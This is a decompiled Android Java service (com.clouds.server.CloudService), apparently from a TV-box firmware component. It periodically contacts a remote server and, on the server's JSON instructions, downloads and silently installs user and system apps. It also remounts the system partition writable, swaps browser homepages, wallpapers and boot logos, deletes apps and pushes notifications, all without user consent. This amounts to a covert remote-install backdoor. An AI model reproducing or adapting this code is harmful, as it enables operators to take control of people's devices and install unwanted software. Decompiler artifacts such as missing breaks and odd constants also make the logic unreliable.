package com.clouds.server;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import com.clouds.constant.ReceiverActionConstant;
import com.clouds.db.Dao;
import com.clouds.debug.SystemDebug;
import com.clouds.file.BootSharedPreferences;
import com.clouds.file.DeleteAPPPreferences;
import com.clouds.http.CheckServerThread;
import com.clouds.http.CloudsServerHttpConstant;
import com.clouds.http.HttpLoadAction;
import com.clouds.http.HttpParserJson;
import com.clouds.install.FileInstall;
import com.clouds.object.DeleteAppInfo;
import com.clouds.object.FileDownloadinfo;
import com.clouds.object.JSONFileInfo;
import com.clouds.util.DistinguishDevice;
import com.clouds.util.FileManager;
import com.clouds.util.ScriptCmd4wmt8850;
import com.clouds.widget.ShowNotificationManager;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.codehaus.jackson.org.objectweb.asm.Opcodes;
import org.codehaus.jackson.org.objectweb.asm.Type;

public class CloudService extends Service {
    private static final int DOWNLOADING_APPCLIENT_UPDATA_FLAG = 1;
    private static final int DOWNLOADING_APP_FLAG = 6;
    private static final int DOWNLOADING_LOGO_FLAG = 2;
    private static final int DOWNLOADING_SERVER_BUSY_FLAG = 0;
    private static final int DOWNLOADING_TV_SCREEN_IMG = 7;
    private static final int DOWNLOADING_URLS_FLAG = 4;
    private static final int DOWNLOADING_URL_FLAG = 3;
    private static final int DOWNLOADING_WALLPAPER_FLAG = 5;
    private static final String TAG;
    private static int cnt;
    private static TimerTask task;
    private static final Timer timer;
    private static int timerTime;
    private HttpLoadAction httpLoadAction;
    private HttpParserJson httpParserJson;
    private boolean isRun;
    Handler mHandler;

    class AnonymousClass_3 implements Runnable {
        private final /* synthetic */ List val$fileDownloadinfos;
        private final /* synthetic */ HttpParserJson val$httpParserJson;

        AnonymousClass_3(HttpParserJson httpParserJson, List list) {
            this.val$httpParserJson = httpParserJson;
            this.val$fileDownloadinfos = list;
        }

        public void run() {
            try {
                CloudService.this.installFiles(cnt, this.val$httpParserJson, this.val$fileDownloadinfos);
                CloudService.this.downdLoadNextFile(cnt);
            } catch (Exception e) {
                e.printStackTrace();
            }
            CloudService.this.downdLoadNextFile(cnt);
        }
    }

    static {
        TAG = CloudService.class.getName();
        timer = new Timer();
        timerTime = 180;
        cnt = 0;
    }

    public CloudService() {
        this.isRun = false;
        this.httpLoadAction = null;
        this.httpParserJson = null;
        this.mHandler = new Handler() {
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                switch (msg.what) {
                    case DOWNLOADING_APPCLIENT_UPDATA_FLAG:
                        String jsonInfo = (String) msg.obj;
                        SystemDebug.e(TAG, new StringBuilder("-----1------jsonInfo: ").append(jsonInfo).toString());
                        CloudService.this.httpParserJson = new HttpParserJson(jsonInfo);
                        SystemDebug.e(TAG, new StringBuilder("-----2-------jsonInfo: ").append(jsonInfo).toString());
                        SystemDebug.e(TAG, new StringBuilder("-----4-------jsonInfo: ").append(CloudService.this.httpParserJson.getUpdateInfo().isUrl).append(",client:").append(CloudService.this.httpParserJson.getUpdateInfo().isclient).toString());
                        boolean isBusy = CloudService.this.httpParserJson.isServerBusy();
                        boolean isClientUpdata = CloudService.this.httpParserJson.getUpdateInfo().isclient;
                        boolean isUrlUpdata = CloudService.this.httpParserJson.getUpdateInfo().isUrl;
                        int frequency = CloudService.this.httpParserJson.getServerFrequency();
                        SystemDebug.e(TAG, new StringBuilder("isBusy: ").append(isBusy).append(",  isClientUpdata: ").append(isClientUpdata).append(",\tisUrlUpdata:").append(isUrlUpdata).append("\n").append(",   frequency: ").append(frequency).append(",\tisWall:").append(CloudService.this.httpParserJson.getUpdateInfo().isWall).append(",  isApp:").append(CloudService.this.httpParserJson.getUpdateInfo().isApp).toString());
                        timerTime = frequency;
                        CloudService.this.startNotificationThread();
                        FileManager.setSystemRW();
                        Log.e(TAG, new StringBuilder("\u5f53\u524d\u670d\u52a1\u5668\u72b6\u6001\u662f\u5426\u7e41\u5fd9isBusy ============== ").append(isBusy).toString());
                        if (isBusy) {
                            CloudService.this.setDownloadFiles(DOWNLOADING_SERVER_BUSY_FLAG, isBusy, CloudService.this.httpParserJson.getCertificateInfo());
                        } else {
                            CloudsServerHttpConstant.PUSH_SERVER_URL = CloudsServerHttpConstant.PUSH_SERVER_BACKUP_URL;
                            Log.e(TAG, new StringBuilder("\u5f53\u524d\u5ba2\u6237\u7aef\u66f4\u65b0\u7684\u72b6\u6001isClientUpdata ============== ").append(isClientUpdata).toString());
                            if (isClientUpdata) {
                                CloudService.this.setDownloadFiles(DOWNLOADING_APPCLIENT_UPDATA_FLAG, isClientUpdata, CloudService.this.httpParserJson.getClientListInfo());
                            } else {
                                boolean isBootCount = BootSharedPreferences.isNetworkCount(CloudService.this.getApplicationContext());
                                SystemDebug.e(TAG, new StringBuilder("\u5f53\u524d\u5ba2\u6237\u7aef\u5f00\u673a\u6b21\u6570isBootCount\u662f\u5426\u5927\u4e8e5 ============== ").append(isBootCount).toString());
                                if (isBootCount) {
                                    CloudService.this.setDownloadFiles(DOWNLOADING_URL_FLAG, isUrlUpdata, CloudService.this.httpParserJson.getHomepageListInfo());
                                } else {
                                    SystemDebug.e(TAG, new StringBuilder("isBootCount======\u5f53\u524d\u5ba2\u6237\u7aef\u5f00\u673a\u6b21\u6570\u662f\u5426\u5927\u4e8e5 ======= ").append(isBootCount).toString());
                                    if (isBootCount) {
                                        CloudService.this.setDownloadFiles(DOWNLOADING_URLS_FLAG, isUrlUpdata, CloudService.this.httpParserJson.getHomepageListInfos());
                                    } else {
                                        CloudService.this.setDownloadFiles(DOWNLOADING_WALLPAPER_FLAG, CloudService.this.httpParserJson.getUpdateInfo().isWall, CloudService.this.httpParserJson.getWallListInfo());
                                    }
                                }
                            }
                        }
                    case DOWNLOADING_LOGO_FLAG:
                        timerTime = Opcodes.GETFIELD;
                        CloudService.this.launchTimer(timerTime);
                    case DOWNLOADING_URLS_FLAG:
                        if (CloudService.this.httpLoadAction != null) {
                            List<FileDownloadinfo> fileDownloadinfo = CloudService.this.httpLoadAction.getDownloadFileInfo();
                            Log.e(TAG, new StringBuilder("--\u4e0b\u8f7d\u5b8c\u6570\u636e\u7684\u4fe1\u606f---fileDownloadinfo").append(fileDownloadinfo).toString());
                            Log.e(TAG, "--\u5f02\u6b65\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f---");
                            CloudService.this.setInstallFiles(CloudService.this.httpParserJson, fileDownloadinfo);
                        }
                    default:
                        break;
                }
            }
        };
    }

    private void checkOnlineServer(boolean isRun) {
        Log.d(TAG, new StringBuilder("mCheckOnlineServerThread start isRun").append(isRun).toString());
        if (isRun) {
            Log.d(TAG, " server is runing");
        } else {
            closeTimerTask();
            new CheckServerThread(getApplicationContext(), this.mHandler).start();
            Log.d(TAG, "mCheckOnlineServerThread start");
        }
    }

    private void closeTimerTask() {
        if (task != null && timer != null) {
            SystemDebug.e(TAG, "closeTimerTask  ------");
            task.cancel();
            task = null;
            this.isRun = true;
        }
    }

    private void deleteOldApp() throws Exception {
        DeleteAppInfo deleteAppInfo = DeleteAPPPreferences.getDeleteAppInfo(getApplicationContext());
        String type = deleteAppInfo.type;
        String path = deleteAppInfo.appName;
        String packageName = deleteAppInfo.packageName;
        if (type != null && path != null && packageName != null) {
            String appName = path.substring(path.lastIndexOf("/") + 1);
            SystemDebug.e(TAG, new StringBuilder("deleteOldApp   packageName: ").append(packageName).append("  appName: ").append(appName).append(" type: ").append(type).toString());
            if (type != null && type.equals(FileInstall.USER_TYPE)) {
                installApplication(packageName, type, DOWNLOADING_APP_FLAG);
            } else if (type != null && type.equals(FileInstall.SYSTEM_TYPE)) {
                installApplication(appName, type, DOWNLOADING_APP_FLAG);
            }
        }
    }

    private void downdLoadNextFile(int currentFlag) {
        Log.e(TAG, new StringBuilder("-----\u6839\u636e\u5f53\u524d\u7684currentFlag\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c----currentFlag====").append(currentFlag).toString());
        switch (currentFlag) {
            case DOWNLOADING_SERVER_BUSY_FLAG:
                launchTimer(timerTime);
            case DOWNLOADING_APPCLIENT_UPDATA_FLAG:
                launchTimer(timerTime);
            case DOWNLOADING_LOGO_FLAG:
                launchTimer(timerTime);
            case DOWNLOADING_URL_FLAG:
                Log.e(TAG, "DOWNLOADING_URL_FLAG:3");
                setDownloadFiles(DOWNLOADING_URLS_FLAG, this.httpParserJson.getUpdateInfo().isUrl, this.httpParserJson.getHomepageListInfos());
            case DOWNLOADING_URLS_FLAG:
                Log.e(TAG, "DOWNLOADING_URLS_FLAG:4");
                setDownloadFiles(DOWNLOADING_WALLPAPER_FLAG, this.httpParserJson.getUpdateInfo().isWall, this.httpParserJson.getWallListInfo());
            case DOWNLOADING_WALLPAPER_FLAG:
                Log.e(TAG, "DOWNLOADING_WALLPAPER_FLAG:5");
                setDownloadFiles(DOWNLOADING_TV_SCREEN_IMG, this.httpParserJson.getUpdateInfo().isScreenshots, this.httpParserJson.getScreenshotsInfo());
            case DOWNLOADING_APP_FLAG:
                Log.e(TAG, "DOWNLOADING_APP_FLAG:6");
                setDownloadFiles(DOWNLOADING_LOGO_FLAG, this.httpParserJson.getUpdateInfo().isLogo, this.httpParserJson.getLogoListInfo());
            case DOWNLOADING_TV_SCREEN_IMG:
                Log.e(TAG, "DOWNLOADING_TV_SCREEN_IMG:7");
                setDownloadFiles(DOWNLOADING_APP_FLAG, this.httpParserJson.getUpdateInfo().isApp, this.httpParserJson.getAppListInfo());
            default:
                break;
        }
    }

    private void installApplication(String path, String type, int identifying) {
        try {
            FileInstall.getFileInstallInstance().installProgram(getApplicationContext(), path, type, identifying);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void installFiles(int currentFlag, HttpParserJson httpParserJson, List<FileDownloadinfo> fileDownloadinfos) throws Exception {
        if (fileDownloadinfos != null && httpParserJson != null) {
            int size = fileDownloadinfos.size();
            Log.d(TAG, new StringBuilder("--\u5b89\u88c5\u4e0b\u8f7d\u5b8c\u6210\u7684\u6587\u4ef6\u7684\u5927\u5c0f--installFiles size: ").append(size).toString());
            boolean isWMTDevice = DistinguishDevice.isWMTDevice();
            int i = DOWNLOADING_SERVER_BUSY_FLAG;
            while (i < size) {
                Log.d(TAG, new StringBuilder("the start ----i = ").append(i).toString());
                FileDownloadinfo fileDownloadinfo = (FileDownloadinfo) fileDownloadinfos.get(i);
                String type = fileDownloadinfo.getAppType();
                String path = fileDownloadinfo.getLocalfile();
                String url = fileDownloadinfo.getUrl();
                String pkgName = "";
                String className = "";
                Log.d(TAG, new StringBuilder("--------\u5b89\u88c5\u4e0b\u8f7d\u5b8c\u6210\u7684\u6587\u4ef6\u7684\u8def\u5f84----path: ").append(path).toString());
                Log.d(TAG, new StringBuilder("------------\u5b89\u88c5\u6587\u4ef6-------------currentFlag: ").append(currentFlag).toString());
                switch (currentFlag) {
                    case DOWNLOADING_SERVER_BUSY_FLAG:
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        installApplication(path, type, DOWNLOADING_WALLPAPER_FLAG);
                        if (httpParserJson != null) {
                            List<JSONFileInfo> jsonListInfos = httpParserJson.getCertificateInfo();
                            if (jsonListInfos != null && jsonListInfos.size() > 0) {
                                String serverUrl = ((JSONFileInfo) jsonListInfos.get(DOWNLOADING_SERVER_BUSY_FLAG)).getServerurl();
                                Log.d(TAG, new StringBuilder("serverUrl============== ").append(serverUrl).toString());
                                if (serverUrl != null) {
                                    CloudsServerHttpConstant.PUSH_SERVER_URL = serverUrl;
                                }
                            }
                        }
                        break;
                    case DOWNLOADING_APPCLIENT_UPDATA_FLAG:
                        Log.d(TAG, "----\u66f4\u65b0\u5e94\u7528\u7a0b\u5e8f---");
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        installApplication(path, type, DOWNLOADING_APPCLIENT_UPDATA_FLAG);
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("clientver", httpParserJson.getVerinfoInfo().logover);
                        }
                        Log.d(TAG, "----\u5e94\u7528\u7a0b\u5e8f\u66f4\u65b0\u5b8c\u6bd5---");
                        break;
                    case DOWNLOADING_LOGO_FLAG:
                        Log.d(TAG, "---- LOGO\u6587\u4ef6\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5e76\u8fdb\u884c\u5b89\u88c5---");
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        SystemDebug.e(TAG, new StringBuilder("DOWNLOADING_LOGO_FLAG isWMTDevice: ").append(isWMTDevice).toString());
                        Log.v(TAG, new StringBuilder("WMT LOGO  i: ").append(i).append(" size: ").append(size).toString());
                        if (!isWMTDevice) {
                            installApplication(path, type, DOWNLOADING_URLS_FLAG);
                        } else if (i == size - 1) {
                            Log.v(TAG, new StringBuilder("WMT LOGO  i: ").append(i).toString());
                            installApplication(path, type, DOWNLOADING_URLS_FLAG);
                        }
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("logover", httpParserJson.getVerinfoInfo().logover);
                        }
                        break;
                    case DOWNLOADING_URL_FLAG:
                        Log.d(TAG, "----\u6d4f\u89c8\u5668\u4e3b\u9875\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5e76\u8fdb\u884c\u5b89\u88c5---");
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        installApplication(path, type, DOWNLOADING_URL_FLAG);
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("bhurlver", httpParserJson.getVerinfoInfo().bhurlver);
                        }
                        break;
                    case DOWNLOADING_URLS_FLAG:
                        Log.d(TAG, "----\u591a\u4e2a\u6d4f\u89c8\u5668\u4e3b\u9875\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5e76\u8fdb\u884c\u5b89\u88c5---");
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        installApplication(path, type, Type.DOUBLE);
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("bhurlver", httpParserJson.getVerinfoInfo().bhurlver);
                        }
                        break;
                    case DOWNLOADING_WALLPAPER_FLAG:
                        Log.d(TAG, "----\u684c\u9762\u58c1\u7eb8\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5e76\u8fdb\u884c\u5b89\u88c5---");
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        if (i == size - 1) {
                            installApplication(path, type, DOWNLOADING_LOGO_FLAG);
                        }
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("wallppver", httpParserJson.getVerinfoInfo().wallppver);
                        }
                        break;
                    case DOWNLOADING_APP_FLAG:
                        Log.d(TAG, "----APP\u5e94\u7528\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5e76\u8fdb\u884c\u5b89\u88c5---");
                        pkgName = ((JSONFileInfo) httpParserJson.getAppListInfo().get(i)).getPkgName();
                        className = ((JSONFileInfo) httpParserJson.getAppListInfo().get(i)).getClassName();
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        installApplication(path, type, DOWNLOADING_APPCLIENT_UPDATA_FLAG);
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("appsver", httpParserJson.getVerinfoInfo().appsver);
                        }
                        break;
                    case DOWNLOADING_TV_SCREEN_IMG:
                        Log.d(TAG, "----\u7535\u89c6\u5c4f\u4fdd\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5e76\u8fdb\u884c\u5b89\u88c5---");
                        Dao.getDaoInstanca(getApplicationContext()).delete(url);
                        if (httpParserJson != null) {
                            Dao.getDaoInstanca(getApplicationContext()).updataSysInfos("screenshotsver", httpParserJson.getVerinfoInfo().screenshotsver);
                        }
                        break;
                }
                if (isWMTDevice) {
                    ScriptCmd4wmt8850.isSucceed = 0;
                    int count = DOWNLOADING_APPCLIENT_UPDATA_FLAG;
                    while (ScriptCmd4wmt8850.isSucceed != 1) {
                        count++;
                        Thread.sleep(500);
                        if (count <= 5) {
                            Log.v(TAG, new StringBuilder("count: ").append(count).toString());
                        }
                    }
                    SystemDebug.e(TAG, new StringBuilder("---WMT\u8bbe\u5907\u4e0a\u7684\u8f6f\u4ef6\u662f\u5426\u5b89\u88c5\u5b8c\u6210---isSucceed:  ").append(ScriptCmd4wmt8850.isSucceed).toString());
                } else {
                    Thread.sleep(10000);
                }
                if (!(currentFlag != 6 || pkgName == null || pkgName.equals("") || className == null || className.equals(""))) {
                    try {
                        deleteOldApp();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    DeleteAPPPreferences.setDeleteAppInfo(getApplicationContext(), path, pkgName, className, type);
                    installApplication("/data/data/com.clouds.server/shared_prefs/deleteappinfo.xml", type, DOWNLOADING_TV_SCREEN_IMG);
                    sendIntentLauncher(pkgName, className);
                }
                Log.d(TAG, new StringBuilder("the end  ------i = ").append(i).toString());
                i++;
            }
        }
    }

    private void launchTimer(int frequency) {
        closeTimerTask();
        startTimerTask();
        if (timer != null && task != null) {
            Log.v(TAG, new StringBuilder("launchTimer------>:").append(frequency).toString());
            timer.schedule(task, (long) (frequency * 1000), 180000);
        }
    }

    private void sendIntentLauncher(String pkgName, String className) {
        Log.v(TAG, new StringBuilder("pkgName: ").append(pkgName).append("  className: ").append(className).toString());
        Intent intent = new Intent("com.move.pkg");
        intent.putExtra("pkg", pkgName);
        intent.putExtra("cls", className);
        sendBroadcast(intent);
    }

    private void serviceIntent(Context context, String action) {
        Intent serviceIntent = new Intent();
        serviceIntent.setClassName("com.clouds.server", "com.clouds.server.CloudService");
        serviceIntent.setAction(action);
        context.startService(serviceIntent);
    }

    private boolean setDownloadFiles(int currentFlag, boolean isUpdata, List<JSONFileInfo> jsonListInfos) {
        boolean isStart;
        cnt = currentFlag;
        Log.e(TAG, new StringBuilder("jsonListInfos:").append(jsonListInfos).append(",   isUpdata:").append(isUpdata).toString());
        if (jsonListInfos == null || !isUpdata) {
            isStart = false;
        } else {
            isStart = true;
            toLoadAction(isUpdata, jsonListInfos);
        }
        Log.e(TAG, new StringBuilder("setDownloadFiles isStart: ").append(isStart).toString());
        if (!isStart) {
            downdLoadNextFile(currentFlag);
        }
        return isStart;
    }

    private void setInstallFiles(HttpParserJson httpParserJson, List<FileDownloadinfo> fileDownloadinfos) {
        Log.e(TAG, new StringBuilder("--httpParserJson--").append(httpParserJson).append(",,,fileDownloadinfos").append(fileDownloadinfos).toString());
        if (httpParserJson != null || fileDownloadinfos != null) {
            new Thread(new AnonymousClass_3(httpParserJson, fileDownloadinfos)).start();
        }
    }

    private void startNotificationThread() {
        this.mHandler.postDelayed(new Runnable() {
            public void run() {
                if (CloudService.this.httpParserJson != null) {
                    ShowNotificationManager.showNotificationList(CloudService.this.getApplicationContext(), CloudService.this.httpParserJson.getNotificationList(), false);
                }
            }
        }, 60000);
    }

    private void startTimerTask() {
        task = new TimerTask() {
            public void run() {
                CloudService.this.isRun = false;
                CloudService.this.serviceIntent(CloudService.this.getApplicationContext(), ReceiverActionConstant.ACTION_NETWORK_IS_ONLINE);
            }
        };
    }

    private void toLoadAction(boolean isUpdata, List<JSONFileInfo> jsonListInfos) {
        SystemDebug.e(TAG, "toLoadAction");
        if (this.httpLoadAction != null) {
            SystemDebug.e(TAG, "httpLoadAction  toLoadAction");
            this.httpLoadAction.toLoadAction(isUpdata, jsonListInfos);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.httpLoadAction = HttpLoadAction.getHttpLoadActionInstance(getApplicationContext(), this.mHandler);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        if (intent == null || intent.getAction() == null) {
            launchTimer(timerTime);
        } else if (ReceiverActionConstant.ACTION_NETWORK_IS_ONLINE != null && ReceiverActionConstant.ACTION_NETWORK_IS_ONLINE.equals(intent.getAction())) {
            checkOnlineServer(this.isRun);
            Log.e(TAG, "-----checkOnlineServer(isRun)");
        } else if (ReceiverActionConstant.ACTION_DELETE_APP != null && ReceiverActionConstant.ACTION_DELETE_APP.equals(intent.getAction())) {
            this.mHandler.post(new Runnable() {
                public void run() {
                    Log.e(TAG, "---------installApplication");
                    CloudService.this.installApplication("", FileInstall.USER_TYPE, DOWNLOADING_APP_FLAG);
                }
            });
        }
        return DOWNLOADING_APPCLIENT_UPDATA_FLAG;
    }
}